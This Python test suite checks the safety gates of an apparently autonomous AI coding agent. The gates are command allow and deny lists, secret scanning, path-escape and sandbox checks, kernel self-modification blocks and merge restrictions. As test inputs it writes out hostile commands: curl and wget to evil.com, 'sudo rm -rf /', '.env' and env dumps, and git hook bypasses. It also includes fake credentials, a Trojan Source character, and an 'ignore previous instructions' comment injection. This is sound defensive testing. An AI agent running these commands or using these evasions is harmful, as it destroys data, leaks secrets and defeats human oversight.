"""Plan ARIA-V9.0-D — implementation_safety invariants.

Closes:
  * ai CRIT-001/002/004 + HIGH-006
  * sec CRIT-001 + HIGH-003/004/005 + MED-018
  * perf HIGH-009
  * arb HIGH-004 (forbidden_scope normalized)
"""
from __future__ import annotations

import dataclasses
import re
import tempfile
import unittest
import unittest.mock
from pathlib import Path
from unittest import mock

from . import _helpers  # noqa: F401

from aria_kernel import implementation_safety as _is

# ORPHAN-CRITICAL-428 — resolved from this file so the workspace root is
# deterministic regardless of the runner's cwd.
_REPO_ROOT = Path(__file__).resolve().parents[4]


class TestV9HardFailRegistry(unittest.TestCase):

    def test_i_v9_safety_15_hard_fail_checks(self):
        """HARD_FAIL_CHECKS MUST contain exactly 17 entries. v1 plan had
        6; v3 audit grew to 15; Plan 031 §031e added the 16th
        (expert_consensus_evidence_verified); the plan-coverage gate
        (ORPHAN-HIGH-310) added the 17th (plan_coverage_witness_verified)."""
        self.assertEqual(
            len(_is.HARD_FAIL_CHECKS), 17,
            f"HARD_FAIL_CHECKS count drifted: {len(_is.HARD_FAIL_CHECKS)} (expected 17)",
        )

    # ORPHAN-CRITICAL-428 — the count above was the ONLY thing pinned, and
    # it passed green while the registry was a name list nothing executed.
    # These cases pin executability instead of arithmetic.
    def test_i_v9_safety_every_check_is_executable(self):
        """A registry entry without a callable must be unconstructable."""
        for entry in _is.HARD_FAIL_CHECKS:
            with self.subTest(check=entry.name):
                self.assertTrue(callable(entry.check))
        with self.assertRaises(TypeError):
            _is.HardFailCheck(
                name="not_executable", description="no callable",
                closes_findings=(), check="a string is not a check",
            )

    def test_i_v9_safety_report_is_conjunction_over_the_whole_registry(self):
        report = _is.run_hard_fail_checks(_is.HardFailContext())
        self.assertEqual(len(report.results), len(_is.HARD_FAIL_CHECKS))
        self.assertEqual(
            {r.name for r in report.results},
            {c.name for c in _is.HARD_FAIL_CHECKS},
        )
        # Unimplemented checks FAIL, so the perimeter reports itself as not
        # holding rather than as absent.
        self.assertFalse(report.passed)
        self.assertIn(
            "check_not_implemented", {r.reason for r in report.failures},
        )

    def test_i_v9_safety_a_failing_check_blocks_the_report(self):
        """An injected failure must make the whole report block."""
        from unittest.mock import patch

        def _boom(context):
            del context
            raise RuntimeError("check exploded")

        exploding = _is.HardFailCheck(
            name="synthetic_explode", description="raises",
            closes_findings=(), check=_boom,
        )
        with patch.object(_is, "HARD_FAIL_CHECKS", (exploding,)):
            report = _is.run_hard_fail_checks(_is.HardFailContext())
        self.assertFalse(report.passed)
        # A raising check is recorded as failing, not allowed to abort the
        # loop and be mistaken for the loop having completed.
        self.assertEqual(len(report.results), 1)
        self.assertIn("check_raised:RuntimeError", report.failures[0].reason)
        with self.assertRaises(_is.HardFailBlocked):
            report.raise_if_blocked()

    def test_i_v9_safety_an_empty_registry_cannot_pass(self):
        """A report over zero checks is not a pass."""
        from unittest.mock import patch

        with patch.object(_is, "HARD_FAIL_CHECKS", ()):
            report = _is.run_hard_fail_checks(_is.HardFailContext())
        self.assertFalse(report.passed)

    def test_i_v9_safety_implemented_checks_actually_refuse(self):
        """The bound implementations block real violations."""
        workspace = _REPO_ROOT
        # Kernel self-modification.
        report = _is.run_hard_fail_checks(_is.HardFailContext(
            workspace_root=workspace,
            diff_text="+ harmless",
            affected_paths=("aria-kernel/aria_kernel/cli.py",),
        ))
        self.assertIn(
            "forbidden_scope_normalized", {r.name for r in report.failures},
        )
        # Secret in the diff.
        report = _is.run_hard_fail_checks(_is.HardFailContext(
            workspace_root=workspace,
            diff_text="AKIA" + "1234567890ABCDEF",
            affected_paths=("README.md",),
        ))
        self.assertIn(
            "secret_scan_diff_clean", {r.name for r in report.failures},
        )
        # Forbidden gh api mutation path.
        report = _is.run_hard_fail_checks(_is.HardFailContext(
            workspace_root=workspace,
            gh_api_paths=("/repos/o/r/branches/main/protection",),
        ))
        self.assertIn(
            "no_main_branch_write", {r.name for r in report.failures},
        )

    def test_i_v9_safety_gate_split_keeps_merge_unsatisfiable(self):
        """ORPHAN-CRITICAL-428 — two gates, and merge is closed by the
        perimeter rather than by a separate switch.

        Splitting the registry is what lets pre-PR-open become satisfiable
        without also opening merge. While any pre-merge check is
        unimplemented the merge gate cannot pass, so there is no flag to
        forget to set.
        """
        gates = {c.gate for c in _is.HARD_FAIL_CHECKS}
        self.assertTrue(gates <= _is.HARD_FAIL_GATES, f"unknown gate in {gates}")
        pre_merge = _is.run_hard_fail_checks(
            _is.HardFailContext(), gate=_is.GATE_PRE_MERGE,
        )
        self.assertFalse(
            pre_merge.passed,
            msg="pre-merge gate must not pass while its checks are unbuilt",
        )
        # Every live implementation belongs to the pre-PR-open stage: those
        # are the checks answerable from the action itself.
        whole = _is.run_hard_fail_checks(_is.HardFailContext())
        by_name = {c.name: c for c in _is.HARD_FAIL_CHECKS}
        for result in whole.results:
            if result.reason != "check_not_implemented":
                with self.subTest(check=result.name):
                    self.assertEqual(by_name[result.name].gate, _is.GATE_PRE_PR_OPEN)
        # Filtering is a partition, not a sample.
        self.assertEqual(
            len(pre_merge.results)
            + len(_is.run_hard_fail_checks(
                _is.HardFailContext(), gate=_is.GATE_PRE_PR_OPEN,
            ).results),
            len(_is.HARD_FAIL_CHECKS),
        )

    def test_i_v9_safety_unknown_gate_raises_rather_than_selecting_nothing(self):
        """A typo must not read as "zero checks, all passed"."""
        with self.assertRaises(ValueError):
            _is.run_hard_fail_checks(_is.HardFailContext(), gate="pre_merg")
        with self.assertRaises(ValueError):
            _is.HardFailCheck(
                name="bad_gate", description="x", closes_findings=(),
                check=lambda ctx: _is.HardFailResult("bad_gate", True, "ok"),
                gate="whenever",
            )

    def test_i_v9_safety_check_names_unique(self):
        """No duplicate check names."""
        names = [c.name for c in _is.HARD_FAIL_CHECKS]
        self.assertEqual(len(names), len(set(names)), "duplicate HARD_FAIL_CHECK name")

    def test_i_v9_safety_check_canonical_names_present(self):
        """The 15 canonical V9.5 names + the Plan 031 §031e addition."""
        expected = {
            "no_force_push", "no_no_verify", "no_main_branch_write",
            "forbidden_scope_normalized",
            "kernel_self_modification_blocked_at_envelope_mint",
            "test_gate_canonical_suite", "secret_scan_diff_clean",
            "bash_command_allowlist", "path_escape_guard",
            "branch_tip_lock_and_recheck", "per_file_mutual_exclusion",
            "operator_feedback_signature", "pr_body_templating",
            "cycle_and_turn_budget_cap", "content_hash_recheck",
            "expert_consensus_evidence_verified",
            "plan_coverage_witness_verified",
        }
        actual = {c.name for c in _is.HARD_FAIL_CHECKS}
        self.assertEqual(
            expected, actual,
            f"canonical 15 hard-fail check names drifted; missing={expected-actual} extra={actual-expected}",
        )


class TestV9Immutable(unittest.TestCase):
    """I-V9-IMMUTABLE-01 — READONLY_PATHS non-empty + canonical."""

    def test_i_v9_immutable_01_readonly_paths_non_empty(self):
        self.assertGreater(len(_is.READONLY_PATHS), 0)

    def test_i_v9_immutable_01_canonical_paths_present(self):
        required = {
            ".claude/agents/", "aria-kernel/aria_kernel/",
            ".github/", "infrastructure/", "docs/adr/",
            ".env", "scripts/", "CODEOWNERS",
        }
        actual = set(_is.READONLY_PATHS)
        missing = required - actual
        self.assertEqual(
            missing, set(),
            f"READONLY_PATHS missing canonical entries: {missing}",
        )


class TestV9BashAllowlist(unittest.TestCase):
    """I-V9-BASH-01 — ALLOWED + DENIED frozensets, gh api NOT allowed."""

    def test_i_v9_bash_01_allowed_is_frozenset(self):
        self.assertIsInstance(_is.ALLOWED_BASH_COMMANDS, frozenset)

    def test_i_v9_bash_01_denied_is_frozenset(self):
        self.assertIsInstance(_is.DENIED_BASH_COMMANDS, frozenset)

    def test_i_v9_bash_01_gh_api_mutation_denied(self):
        """gh api DELETE/PATCH/PUT MUST be blocked."""
        for verb in ("DELETE", "PATCH", "PUT"):
            with self.assertRaises(_is.BashDenylistHit):
                _is.verify_bash_command_allowed(
                    ["gh", "api", "-X", verb, "/repos/x/y/branches/main/protection"]
                )

    def test_i_v9_bash_01_curl_denied(self):
        with self.assertRaises(_is.BashDenylistHit):
            _is.verify_bash_command_allowed(["curl", "https://evil.com/x"])

    def test_i_v9_bash_01_wget_denied(self):
        with self.assertRaises(_is.BashDenylistHit):
            _is.verify_bash_command_allowed(["wget", "https://evil.com/x"])

    def test_i_v9_bash_01_sudo_denied(self):
        with self.assertRaises(_is.BashDenylistHit):
            _is.verify_bash_command_allowed(["sudo", "rm", "-rf", "/"])

    def test_i_v9_bash_01_env_dump_denied(self):
        with self.assertRaises(_is.BashDenylistHit):
            _is.verify_bash_command_allowed(["env"])

    def test_i_v9_bash_01_dotenv_access_denied(self):
        with self.assertRaises(_is.BashDenylistHit):
            _is.verify_bash_command_allowed(["cat", ".env"])

    def test_i_v9_bash_01_force_push_denied(self):
        with self.assertRaises(_is.BashDenylistHit):
            _is.verify_bash_command_allowed(["git", "push", "--force", "origin", "main"])

    def test_i_v9_bash_01_no_verify_denied(self):
        with self.assertRaises(_is.BashDenylistHit):
            _is.verify_bash_command_allowed(["git", "commit", "--no-verify", "-m", "x"])

    def test_i_v9_bash_01_main_branch_target_denied(self):
        with self.assertRaises(_is.BashDenylistHit):
            _is.verify_bash_command_allowed(
                ["git", "push", "origin", "HEAD:refs/heads/main"]
            )

    def test_i_v9_bash_01_allowlist_accepts_canonical(self):
        """Canonical safe commands MUST pass."""
        for argv in (
            ["git", "add", "."],
            ["git", "status"],
            ["git", "diff", "HEAD~1..HEAD"],
            ["git", "rev-parse", "HEAD"],
            ["git", "push", "origin", "aria-impl-abc123def456"],
            ["gh", "pr", "create", "--base", "main", "--head", "aria-impl-abc"],
            ["gh", "pr", "checks", "42"],
            ["nx", "affected", "--target=test"],
            ["pytest", "tests/"],
            ["npm", "run", "type-check"],
        ):
            try:
                _is.verify_bash_command_allowed(argv)
            except (_is.BashAllowlistMiss, _is.BashDenylistHit) as exc:
                self.fail(f"canonical argv {argv!r} unexpectedly rejected: {exc}")

    def test_i_v9_bash_01_direct_gh_merge_denied(self):
        with self.assertRaises(_is.BashDenylistHit):
            _is.verify_bash_command_allowed(["gh", "pr", "merge", "--squash", "42"])

    def test_i_v9_bash_01_empty_argv_rejected(self):
        with self.assertRaises(_is.BashAllowlistMiss):
            _is.verify_bash_command_allowed([])

    def test_i_v9_bash_01_unknown_argv_rejected(self):
        with self.assertRaises(_is.BashAllowlistMiss):
            _is.verify_bash_command_allowed(["unknown-binary", "x", "y"])


class TestV9SecretScan(unittest.TestCase):
    """I-V9-SECRET-01 — verify_no_secret_in_diff + envelope."""

    def test_i_v9_secret_01_aws_access_key_caught(self):
        fake_aws_key = "AKIA" + "IOSFODNN7EXAMPLE"
        diff = f"{fake_aws_key} in test fixture"
        with self.assertRaises(_is.SecretLeakDetected):
            _is.verify_no_secret_in_diff(diff)

    def test_i_v9_secret_01_github_pat_caught(self):
        fake_pat = "ghp_" + "abcdefghijklmnopqrstuvwxyz0123456789"
        diff = f"token = {fake_pat}"
        with self.assertRaises(_is.SecretLeakDetected):
            _is.verify_no_secret_in_diff(diff)

    def test_i_v9_secret_01_anthropic_key_caught(self):
        diff = "ANTHROPIC_API_KEY=sk-ant-api03-deadbeef0123456789abcdef0123456"
        with self.assertRaises(_is.SecretLeakDetected):
            _is.verify_no_secret_in_diff(diff)

    def test_i_v9_secret_01_private_key_caught(self):
        diff = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAA..."
        with self.assertRaises(_is.SecretLeakDetected):
            _is.verify_no_secret_in_diff(diff)

    def test_i_v9_secret_01_clean_diff_passes(self):
        diff = "diff --git a/x.py b/x.py\n+def foo():\n+    return 42\n"
        _is.verify_no_secret_in_diff(diff)  # MUST NOT raise

    def test_i_v9_secret_01_envelope_scan(self):
        """Envelope content scanned at JSON-serialize level."""
        fake_aws_key = "AKIA" + "IOSFODNN7EXAMPLE"
        bad = {"details": {"validation_results": [{"stdout": fake_aws_key}]}}
        with self.assertRaises(_is.SecretLeakDetected):
            _is.verify_no_secret_in_envelope(bad)

    def test_i_v9_secret_01_error_message_does_not_leak_value(self):
        """SecretLeakDetected message MUST count hits but NOT include
        the actual matched values."""
        fake_aws_key = "AKIA" + "IOSFODNN7EXAMPLE"
        diff = fake_aws_key
        try:
            _is.verify_no_secret_in_diff(diff)
            self.fail("expected SecretLeakDetected")
        except _is.SecretLeakDetected as exc:
            self.assertNotIn(fake_aws_key, str(exc))
            self.assertIn("REDACTED", str(exc).upper())


class TestV9PathEscape(unittest.TestCase):
    """I-V9-PATH-01 — verify_no_path_escape mirrors
    agent_compliance:168-178 pattern."""

    def test_i_v9_path_01_inside_workspace_ok(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_p = Path(tmp).resolve()
            (tmp_p / "subdir").mkdir()
            resolved = _is.verify_no_path_escape("subdir/file.txt", tmp)
            self.assertTrue(str(resolved).startswith(str(tmp_p)))

    def test_i_v9_path_01_dotdot_traversal_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            inner = Path(tmp) / "inner"
            inner.mkdir()
            with self.assertRaises(_is.PathEscape):
                _is.verify_no_path_escape("../outside.txt", inner)

    def test_i_v9_path_01_absolute_path_outside_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaises(_is.PathEscape):
                _is.verify_no_path_escape("/etc/passwd", tmp)


class TestV9BranchNameMint(unittest.TestCase):
    """I-V9-BRANCH-01 — unpredictable branch name (HIGH-009)."""

    def test_i_v9_branch_01_prefix_canonical(self):
        name = _is.mint_unpredictable_feature_branch_name("plan-123")
        self.assertTrue(name.startswith("aria-impl-"))

    def test_i_v9_branch_01_128_bit_entropy(self):
        name = _is.mint_unpredictable_feature_branch_name("plan-123")
        suffix = name.removeprefix("aria-impl-")
        self.assertEqual(len(suffix), 32)  # 16 bytes hex = 32 chars
        self.assertTrue(all(c in "0123456789abcdef" for c in suffix))

    def test_i_v9_branch_01_collision_resistance(self):
        """100 mints with SAME plan_id MUST all produce unique names —
        adversary cannot predict from plan_id alone."""
        seen = set()
        for _ in range(100):
            name = _is.mint_unpredictable_feature_branch_name("plan-collision-test")
            self.assertNotIn(name, seen)
            seen.add(name)

    def test_i_v9_branch_01_empty_plan_id_rejected(self):
        with self.assertRaises(ValueError):
            _is.mint_unpredictable_feature_branch_name("")


class TestV9GhApiForbidden(unittest.TestCase):
    """I-V9-GH-01 — FORBIDDEN_GH_API_PATHS pinned."""

    def test_i_v9_gh_01_branch_protection_forbidden(self):
        self.assertTrue(_is.is_gh_api_path_forbidden("/repos/x/y/branches/main/protection"))

    def test_i_v9_gh_01_actions_forbidden(self):
        self.assertTrue(_is.is_gh_api_path_forbidden("/repos/x/y/actions/workflows"))

    def test_i_v9_gh_01_secrets_forbidden(self):
        self.assertTrue(_is.is_gh_api_path_forbidden("/repos/x/y/secrets/foo"))

    def test_i_v9_gh_01_orgs_forbidden(self):
        self.assertTrue(_is.is_gh_api_path_forbidden("/orgs/whatever"))

    def test_i_v9_gh_01_safe_path_permitted(self):
        self.assertFalse(_is.is_gh_api_path_forbidden("/repos/x/y/pulls/42"))

    def test_i_v9_gh_01_merge_endpoint_variants_forbidden(self):
        for path in (
            "/repos/x/y/pulls/42/merge",
            "repos/x/y/pulls/42/merge",
            "/repos/x/y/pulls/42/merge/",
            "/repos/x/y/pulls/42/merge?sha=abc",
            "/repos/x/y/pulls/{number}/merge",
            "/repos/x/y/pulls/$(number)/merge",
        ):
            self.assertTrue(_is.is_gh_api_path_forbidden(path), path)

    def test_i_v9_bash_01_gh_api_merge_variants_denied(self):
        for argv in (
            ["gh", "api", "/repos/x/y/pulls/42/merge"],
            ["gh", "api", "repos/x/y/pulls/42/merge"],
            ["gh", "api", "/repos/x/y/pulls/42/merge/"],
            ["gh", "api", "/repos/x/y/pulls/42/merge?sha=abc"],
            ["bash", "-c", "gh api /repos/x/y/pulls/42/merge"],
        ):
            with self.assertRaises((_is.BashDenylistHit, _is.BashAllowlistMiss), msg=str(argv)):
                _is.verify_bash_command_allowed(list(argv))


class TestV9SizeCap(unittest.TestCase):
    """PERF-HIGH-009 — MAX_VALIDATION_RESULT_BYTES."""

    def test_i_v9_perf_validation_result_size_cap(self):
        self.assertEqual(_is.MAX_VALIDATION_RESULT_BYTES, 4096)

    def test_truncate_under_cap_passthrough(self):
        text = "x" * 100
        result = _is.truncate_validation_result(text)
        self.assertEqual(result, text)

    def test_truncate_over_cap_truncates(self):
        text = "x" * 10000
        result = _is.truncate_validation_result(text)
        self.assertLessEqual(len(result), 4500)  # head + tail + marker
        self.assertIn("TRUNCATED", result)


class TestPhaseAPrePrOpenChecks(unittest.TestCase):
    """ORPHAN-CRITICAL-428 phase A — the five mechanical checks.

    Every case is behavioural: it calls the bound implementation and
    asserts a verdict. Pinning names or counts is what let a registry of
    seventeen unbuilt checks read as a green perimeter in the first
    place, so nothing here asserts the shape of the registry.

    Each check gets both halves — a clean action passes, and a specific
    violation fails with a reason that names it.
    """

    def _ctx(self, **kwargs):
        return _is.HardFailContext(**kwargs)

    # --- no_force_push -----------------------------------------------
    def test_no_force_push_clean_aria_branch_passes(self):
        result = _is._check_no_force_push(
            self._ctx(push_refspecs=("HEAD:refs/heads/aria-impl-abc123def456",))
        )
        self.assertTrue(result.passed, result.reason)

    def test_no_force_push_plus_prefix_is_a_force_push(self):
        result = _is._check_no_force_push(
            self._ctx(push_refspecs=("+HEAD:refs/heads/aria-impl-abc123def456",))
        )
        self.assertFalse(result.passed)
        self.assertIn("force_refspec", result.reason)

    def test_no_force_push_main_destination_refused(self):
        result = _is._check_no_force_push(
            self._ctx(push_refspecs=("HEAD:refs/heads/main",))
        )
        self.assertFalse(result.passed)
        self.assertIn("non_aria_impl_ref", result.reason)

    def test_no_force_push_ref_deletion_refused(self):
        result = _is._check_no_force_push(
            self._ctx(push_refspecs=(":refs/heads/aria-impl-abc123def456",))
        )
        self.assertFalse(result.passed)
        self.assertIn("ref_deletion", result.reason)

    def test_no_force_push_branch_grammar_shared_with_argv_allowlist(self):
        """The refspec check and the argv allowlist must agree.

        Two encodings of "valid ARIA branch" would eventually disagree,
        and the looser one would be the real perimeter.
        """
        branch = "aria-impl-abc123def456"
        refspec_ok = _is._check_no_force_push(
            self._ctx(push_refspecs=(branch,))
        ).passed
        argv_ok = True
        try:
            _is.verify_bash_command_allowed(["git", "push", "origin", branch])
        except Exception:
            argv_ok = False
        self.assertEqual(refspec_ok, argv_ok)
        self.assertTrue(refspec_ok)

    # --- no_no_verify ------------------------------------------------
    def test_no_no_verify_clean_commit_passes(self):
        result = _is._check_no_no_verify(
            self._ctx(bash_argv=("git", "commit", "-m", "fix: thing"))
        )
        self.assertTrue(result.passed, result.reason)

    def test_no_no_verify_long_flag_refused(self):
        result = _is._check_no_no_verify(
            self._ctx(bash_argv=("git", "commit", "--no-verify", "-m", "x"))
        )
        self.assertFalse(result.passed)
        self.assertIn("hook_bypass_flag", result.reason)

    def test_no_no_verify_short_form_refused(self):
        """`git commit -n` IS --no-verify.

        The argv denylist matches the literal `--no-verify`, so the short
        form was the gap this check exists to close.
        """
        result = _is._check_no_no_verify(
            self._ctx(bash_argv=("git", "commit", "-n", "-m", "x"))
        )
        self.assertFalse(result.passed)
        self.assertIn("hook_bypass_flag", result.reason)

    def test_no_no_verify_hooks_path_split_across_argv_refused(self):
        result = _is._check_no_no_verify(
            self._ctx(bash_argv=("git", "-c", "core.hooksPath=/dev/null", "commit", "-m", "x"))
        )
        self.assertFalse(result.passed)
        self.assertIn("hooks_path_override", result.reason)

    # --- kernel_self_modification_blocked_at_envelope_mint -----------
    def test_kernel_self_mod_clean_envelope_passes(self):
        result = _is._check_kernel_self_modification_at_mint(
            self._ctx(envelope={"affected_surfaces": ["docs/reviews/x.md", "tests/y.py"]})
        )
        self.assertTrue(result.passed, result.reason)

    def test_kernel_self_mod_declared_kernel_path_refused(self):
        result = _is._check_kernel_self_modification_at_mint(
            self._ctx(envelope={"affected_surfaces": ["aria-kernel/aria_kernel/cycle.py"]})
        )
        self.assertFalse(result.passed)
        self.assertIn("readonly_surface_declared", result.reason)

    def test_kernel_self_mod_missing_envelope_fails_closed(self):
        result = _is._check_kernel_self_modification_at_mint(self._ctx())
        self.assertFalse(result.passed)
        self.assertEqual(result.reason, "envelope_absent")

    def test_kernel_self_mod_traversal_refused(self):
        result = _is._check_kernel_self_modification_at_mint(
            self._ctx(envelope={"affected_surfaces": ["docs/../aria-kernel/aria_kernel/cycle.py"]})
        )
        self.assertFalse(result.passed)
        self.assertIn("traversal_in_declared_surface", result.reason)

    def test_kernel_self_mod_catches_what_scope_check_cannot(self):
        """The two READONLY checks are not duplicates.

        forbidden_scope_normalized resolves paths against a real
        workspace; at envelope-mint time there is no such workspace, so
        it fails for want of a root while the mint check still refuses
        the declared surface.
        """
        envelope = {"affected_surfaces": [".github/workflows/aria-auto-cycle.yml"]}
        mint = _is._check_kernel_self_modification_at_mint(self._ctx(envelope=envelope))
        scope = _is._check_forbidden_scope_normalized(self._ctx(envelope=envelope))
        self.assertFalse(mint.passed)
        self.assertIn("readonly_surface_declared", mint.reason)
        self.assertFalse(scope.passed)
        self.assertEqual(scope.reason, "workspace_root_absent")

    # --- test_gate_canonical_suite -----------------------------------
    def test_canonical_suite_complete_declaration_passes(self):
        result = _is._check_test_gate_canonical_suite(
            self._ctx(validation_commands=_is.CANONICAL_VALIDATION_COMMANDS)
        )
        self.assertTrue(result.passed, result.reason)

    def test_canonical_suite_missing_lint_refused(self):
        result = _is._check_test_gate_canonical_suite(
            self._ctx(validation_commands=(
                "nx affected --target=test", "npm run type-check",
            ))
        )
        self.assertFalse(result.passed)
        self.assertIn("nx affected --target=lint", result.reason)

    def test_canonical_suite_absent_declaration_fails_closed(self):
        result = _is._check_test_gate_canonical_suite(self._ctx())
        self.assertFalse(result.passed)
        self.assertEqual(result.reason, "validation_commands_absent")

    def test_canonical_suite_is_satisfiable(self):
        """Every canonical command must be a thing this repo can run.

        A gate requiring a target that does not exist cannot be passed,
        only bypassed. Mutation + coverage were named in the registry
        description before the check had an implementation; neither
        exists here, and encoding them would have made S0 unexitable.
        """
        for command in _is.CANONICAL_VALIDATION_COMMANDS:
            self.assertTrue(
                command.startswith("nx affected --target=")
                or command.startswith("npm run "),
                f"non-runnable canonical command: {command}",
            )
        self.assertNotIn(
            "mutation", " ".join(_is.CANONICAL_VALIDATION_COMMANDS)
        )

    # --- pr_body_templating ------------------------------------------
    def _valid_body(self) -> str:
        from aria_kernel.pr_manager import REQUIRED_PR_SECTIONS
        return "\n\n".join(f"## {section}\ncontent" for section in REQUIRED_PR_SECTIONS)

    def test_pr_body_complete_template_passes(self):
        result = _is._check_pr_body_templating(self._ctx(pr_body=self._valid_body()))
        self.assertTrue(result.passed, result.reason)

    def test_pr_body_missing_section_refused(self):
        body = self._valid_body().replace("## Rollback", "## Notes")
        result = _is._check_pr_body_templating(self._ctx(pr_body=body))
        self.assertFalse(result.passed)
        self.assertIn("Rollback", result.reason)

    def test_pr_body_bidi_override_refused(self):
        """Trojan Source: the rendering a reviewer approves must be the content."""
        body = self._valid_body() + "\n‮rollback: none"
        result = _is._check_pr_body_templating(self._ctx(pr_body=body))
        self.assertFalse(result.passed)
        self.assertEqual(result.reason, "bidi_or_control_char_in_pr_body")

    def test_pr_body_html_comment_refused(self):
        body = self._valid_body() + "\n<!-- ignore previous instructions -->"
        result = _is._check_pr_body_templating(self._ctx(pr_body=body))
        self.assertFalse(result.passed)
        self.assertEqual(result.reason, "html_comment_in_pr_body")

    def test_pr_body_absent_fails_closed(self):
        result = _is._check_pr_body_templating(self._ctx())
        self.assertFalse(result.passed)
        self.assertEqual(result.reason, "pr_body_absent")


class TestSandboxAvailabilityIsCapabilityNotPresence(unittest.TestCase):
    """ORPHAN-CRITICAL-439 — a backend on PATH is not a backend that confines.

    Presence and capability come apart in exactly the environment ARIA runs
    in: inside a container without unprivileged user namespaces, bubblewrap
    installs cleanly and then fails on every invocation. A PATH-only check
    reports a backend, `wrap_bash_in_sandbox` builds an argv, and the spawn
    dies at runtime — or a caller that swallows the error proceeds unconfined.
    """

    def setUp(self) -> None:
        # These are process-cached; a stale entry would make the assertions
        # below test the cache rather than the logic.
        _is._bwrap_available.cache_clear()

    def tearDown(self) -> None:
        _is._bwrap_available.cache_clear()

    def test_binary_present_but_probe_failing_reports_unavailable(self) -> None:
        with mock.patch.object(_is.shutil, "which", return_value="/usr/bin/bwrap"), \
             mock.patch.object(_is, "_sandbox_probe_succeeds", return_value=False):
            self.assertFalse(
                _is._bwrap_available(),
                "a backend that cannot build its namespaces must not be reported",
            )
            self.assertIsNone(_is.sandbox_backend())

    def test_binary_present_and_probe_passing_reports_available(self) -> None:
        with mock.patch.object(_is.shutil, "which", return_value="/usr/bin/bwrap"), \
             mock.patch.object(_is, "_sandbox_probe_succeeds", return_value=True):
            self.assertTrue(_is._bwrap_available())
            self.assertEqual(_is.sandbox_backend(), "bwrap")

    def test_probe_exercises_every_feature_the_real_wrapper_relies_on(self) -> None:
        """A probe weaker than the wrapper can pass while the wrapper fails."""
        probe = set(_is._bwrap_probe_argv())
        for required in ("--unshare-net", "--tmpfs", "--proc", "--dev", "--ro-bind"):
            self.assertIn(
                required, probe,
                f"probe omits {required}, which wrap_bash_in_sandbox depends on",
            )
        # The dynamic loader lives under /lib64; binding only /usr would let the
        # probe pass on a host where the real wrapper cannot exec anything.
        for mount in ("/usr", "/lib", "/lib64", "/bin"):
            self.assertIn(mount, probe, f"probe omits the {mount} ro-bind")

    def test_firejail_is_not_an_accepted_backend(self) -> None:
        """ORPHAN-CRITICAL-451 — it applied none of the READONLY_PATHS.

        `sandbox_backend()` returning non-None is PLAN.md's S0 exit
        criterion and is read by callers as proof containment is in force.
        The firejail branch whitelisted the workspace — kernel included —
        and ro-bound nothing, so selecting it cleared the gate with the
        property the gate exists for entirely absent.
        """
        self.assertFalse(hasattr(_is, "_firejail_available"))
        self.assertFalse(hasattr(_is, "_FIREJAIL_PROBE_ARGV"))
        with mock.patch.object(_is, "_bwrap_available", return_value=False):
            self.assertIsNone(_is.sandbox_backend())

    def test_probe_and_wrapper_agree_on_the_system_binds(self) -> None:
        """ORPHAN-MEDIUM-452 — the comment above the probe demands this."""
        with mock.patch.object(_is, "_bwrap_available", return_value=True), \
             tempfile.TemporaryDirectory() as workspace:
            wrapper = _is.wrap_bash_in_sandbox(["true"], workspace_root=workspace)
        probe = _is._bwrap_probe_argv()
        for root in _is._SANDBOX_SYSTEM_ROOTS:
            if root in wrapper:
                self.assertIn(
                    root, probe,
                    f"the wrapper binds {root} and the probe does not",
                )

    def test_probe_treats_a_missing_binary_as_unavailable_without_raising(self) -> None:
        self.assertFalse(
            _is._sandbox_probe_succeeds(("definitely-not-a-real-binary-xyz", "true"))
        )

    def test_no_backend_means_wrap_raises_rather_than_returning_bare_argv(self) -> None:
        with mock.patch.object(_is, "_bwrap_available", return_value=False), \
             tempfile.TemporaryDirectory() as workspace:
            with self.assertRaises(_is.SandboxUnavailable):
                _is.wrap_bash_in_sandbox(["true"], workspace_root=workspace)


class TestPhaseAGateExitCriterion(unittest.TestCase):
    """The S0 exit criterion, asserted rather than described.

    docs/plans/2026-07-26-aria-software-team-program/PLAN.md — S0 exits
    when the pre-PR-open gate passes for a clean action and refuses each
    violation, while the pre-merge gate remains unsatisfiable so merge
    stays closed by the perimeter itself rather than by a flag.
    """

    def _clean_context(self, workspace: Path) -> "_is.HardFailContext":
        from aria_kernel.pr_manager import REQUIRED_PR_SECTIONS
        (workspace / "docs").mkdir(parents=True, exist_ok=True)
        (workspace / "docs" / "note.md").write_text("ok\n", encoding="utf-8")
        return _is.HardFailContext(
            workspace_root=workspace,
            diff_text="+++ b/docs/note.md\n+ok\n",
            envelope={"affected_surfaces": ["docs/note.md"]},
            bash_argv=("git", "commit", "-m", "docs: note"),
            gh_api_paths=("/repos/o/r/pulls",),
            push_refspecs=("HEAD:refs/heads/aria-impl-abc123def456",),
            affected_paths=("docs/note.md",),
            validation_commands=_is.CANONICAL_VALIDATION_COMMANDS,
            base_branch="main",
            pr_body="\n\n".join(f"## {s}\ncontent" for s in REQUIRED_PR_SECTIONS),
        )

    def test_pre_pr_open_gate_passes_for_a_clean_action(self):
        with tempfile.TemporaryDirectory() as tmp:
            report = _is.run_hard_fail_checks(
                self._clean_context(Path(tmp)), gate=_is.GATE_PRE_PR_OPEN
            )
            self.assertTrue(
                report.passed,
                "pre-PR-open gate blocked a clean action: "
                + "; ".join(f"{r.name}: {r.reason}" for r in report.failures),
            )

    def test_pre_pr_open_gate_refuses_each_violation(self):
        violations = {
            "forbidden_scope_normalized": {
                "affected_paths": ("aria-kernel/aria_kernel/cycle.py",)
            },
            "kernel_self_modification_blocked_at_envelope_mint": {
                "envelope": {"affected_surfaces": ["aria-kernel/aria_kernel/cycle.py"]}
            },
            "secret_scan_diff_clean": {
                "diff_text": "+AKIAIOSFODNN7EXAMPLE\n"
            },
            "no_main_branch_write": {
                "gh_api_paths": ("/repos/o/r/branches/main/protection",)
            },
            "no_force_push": {
                "push_refspecs": ("+HEAD:refs/heads/main",)
            },
            "no_no_verify": {
                "bash_argv": ("git", "commit", "--no-verify", "-m", "x")
            },
            "test_gate_canonical_suite": {
                "validation_commands": ("echo ok",)
            },
            "pr_body_templating": {
                "pr_body": "## Problem\nno other sections"
            },
        }
        with tempfile.TemporaryDirectory() as tmp:
            workspace = Path(tmp)
            for expected_name, override in violations.items():
                with self.subTest(check=expected_name):
                    context = dataclasses.replace(
                        self._clean_context(workspace), **override
                    )
                    report = _is.run_hard_fail_checks(
                        context, gate=_is.GATE_PRE_PR_OPEN
                    )
                    self.assertFalse(report.passed)
                    self.assertIn(
                        expected_name,
                        {failure.name for failure in report.failures},
                    )

